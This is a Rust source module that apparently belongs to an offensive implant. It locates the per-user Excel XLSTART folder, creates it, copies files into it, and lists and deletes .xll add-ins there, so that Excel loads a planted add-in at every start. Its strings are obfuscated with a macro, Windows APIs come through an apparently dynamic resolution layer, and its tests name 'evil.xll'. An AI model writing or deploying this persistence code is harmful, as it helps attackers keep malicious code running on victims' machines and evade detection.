// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//! xlstart — XLSTART path / copy / basename helpers.

pub fn basename(path: &str) -> &str {
    let trimmed = path.trim_end_matches(['\\', '/']);
    let i = trimmed.rfind(['\\', '/']).map(|i| i + 1).unwrap_or(0);
    &trimmed[i..]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn basename_unc() {
        assert_eq!(basename("\\\\srv\\share\\evil.xll"), "evil.xll");
    }

    #[test]
    fn basename_drive() {
        assert_eq!(basename("C:\\dir\\evil.xll"), "evil.xll");
    }

    #[test]
    fn basename_trailing_slash() {
        assert_eq!(basename("C:\\dir\\evil.xll\\"), "evil.xll");
    }

    #[test]
    fn basename_no_separator() {
        assert_eq!(basename("evil.xll"), "evil.xll");
    }

    #[test]
    fn basename_empty() {
        assert_eq!(basename(""), "");
    }
}

#[cfg(target_os = "windows")]
mod win {
    extern crate alloc;
    use alloc::vec::Vec;
    use alloc::string::String;
    use core::ptr::null_mut;
    use common::obf_cstr;
    use crate::dfr::*;

    pub fn resolve_dir() -> Result<String, ()> {
        let mut buf = [0u8; MAX_PATH_BYTES];
        let rc = match unsafe {
            SHGetFolderPathA(0, CSIDL_APPDATA, 0, 0, buf.as_mut_ptr())
        } { Ok(c) => c, Err(_) => return Err(()) };
        if rc != 0 { return Err(()); }
        let appdata = cstring_to_string(&buf);
        obf_cstr! { let tail = c"\\Microsoft\\Excel\\XLSTART"; }
        let tail_s = core::str::from_utf8(tail.to_bytes()).unwrap_or("");
        let mut out = String::with_capacity(appdata.len() + tail_s.len());
        out.push_str(&appdata);
        out.push_str(tail_s);
        Ok(out)
    }

    pub fn ensure_dir(dir: &str) -> Result<(), ()> {
        let c = cstr(dir);
        let rc = match unsafe { CreateDirectoryA(c.as_ptr() as *const i8, null_mut()) } {
            Ok(c) => c, Err(_) => return Err(()),
        };
        if rc != 0 { return Ok(()); }
        let err = match unsafe { GetLastError() } { Ok(c) => c, Err(_) => 0 };
        if err == ERROR_ALREADY_EXISTS { Ok(()) } else { Err(()) }
    }

    pub fn copy_into(src: &str, dst_dir: &str, dst_name: &str) -> Result<(), ()> {
        let mut dst = String::with_capacity(dst_dir.len() + 1 + dst_name.len());
        dst.push_str(dst_dir);
        dst.push('\\');
        dst.push_str(dst_name);
        let s = cstr(src);
        let d = cstr(&dst);
        let rc = match unsafe { CopyFileA(s.as_ptr() as *const i8, d.as_ptr() as *const i8, 0) } {
            Ok(c) => c, Err(_) => return Err(()),
        };
        if rc != 0 { Ok(()) } else { Err(()) }
    }

    pub fn delete_file_path(path: &str) -> Result<(), ()> {
        let c = cstr(path);
        let rc = match unsafe { DeleteFileA(c.as_ptr() as *const i8) } {
            Ok(c) => c, Err(_) => return Err(()),
        };
        if rc != 0 { Ok(()) } else { Err(()) }
    }

    pub fn list(dir: &str) -> Vec<String> {
        let mut out = Vec::new();
        obf_cstr! { let suffix = c"\\*.xll"; }
        let suffix_s = core::str::from_utf8(suffix.to_bytes()).unwrap_or("");
        let mut glob = String::with_capacity(dir.len() + suffix_s.len());
        glob.push_str(dir);
        glob.push_str(suffix_s);
        let glob_c = cstr(&glob);
        let mut fd: WIN32_FIND_DATAA = unsafe { core::mem::zeroed() };
        let h = match unsafe { FindFirstFileA(glob_c.as_ptr() as *const i8, &mut fd) } {
            Ok(h) => h, Err(_) => return out,
        };
        if h == INVALID_HANDLE_VALUE { return out; }
        loop {
            let name = cstring_to_string(&fd.c_file_name);
            if !name.is_empty() { out.push(name); }
            let next = match unsafe { FindNextFileA(h, &mut fd) } {
                Ok(c) => c, Err(_) => 0,
            };
            if next == 0 { break; }
        }
        let _ = unsafe { FindClose(h) };
        out
    }

    fn cstr(s: &str) -> Vec<u8> {
        let mut v = Vec::with_capacity(s.len() + 1);
        v.extend_from_slice(s.as_bytes());
        v.push(0);
        v
    }

    fn cstring_to_string(buf: &[u8]) -> String {
        let end = buf.iter().position(|b| *b == 0).unwrap_or(buf.len());
        String::from_utf8_lossy(&buf[..end]).into_owned()
    }
}

#[cfg(target_os = "windows")]
pub use win::*;
